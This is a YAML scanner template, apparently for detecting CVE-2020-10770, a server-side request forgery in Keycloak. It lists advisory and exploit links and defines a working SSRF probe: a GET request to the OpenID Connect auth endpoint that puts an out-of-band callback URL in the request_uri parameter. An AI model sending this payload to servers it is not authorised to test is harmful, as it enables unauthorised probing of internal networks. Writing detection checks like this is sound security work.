name: yaml-poc-redhat-keycloak-logical-CVE-2020-10770
binding: 92f751bb-1dce-455a-968d-5509267c48bd
detail:
    author: system_user
    links:
        - http://packetstormsecurity.com/files/164499/Keycloak-12.0.1-Server-Side-Request-Forgery.html
        - https://access.redhat.com/security/cve/cve-2020-10770
        - https://bugzilla.redhat.com/show_bug.cgi?id=1846270
        - https://cxsecurity.com/issue/WLB-2021100066
        - https://nvd.nist.gov/vuln/detail/CVE-2020-10770
        - https://packetstormsecurity.com/files/161221/Red-Hat-Security-Advisory-2021-0318-01.html
        - https://packetstormsecurity.com/files/161243/Red-Hat-Security-Advisory-2021-0327-01.html
        - https://packetstormsecurity.com/files/164499/Keycloak-12.0.1-Server-Side-Request-Forgery.html
        - https://vigilance.fr/vulnerability/Keycloak-information-disclosure-via-SSRF-34448
        - https://www.auscert.org.au/bulletins/ESB-2021.0343/
        - https://www.exploit-db.com/exploits/50405
    vulnerability:
        id: 85a42bf5-27f3-42e5-84a0-7bab1613adeb
        level: medium
transport: http
set:
    reverse: newReverse()
    reverseUrl: reverse.url
rules:
    r0:
        request:
            cache: true
            method: GET
            path: /auth/realms/master/protocol/openid-connect/auth?scope=openid&response_type=code&redirect_uri=valid&state=cfx&nonce=cfx&client_id=security-admin-console&request_uri={{reverseUrl}}
            follow_redirects: true
        expression: reverse.wait(5)
expression: r0()
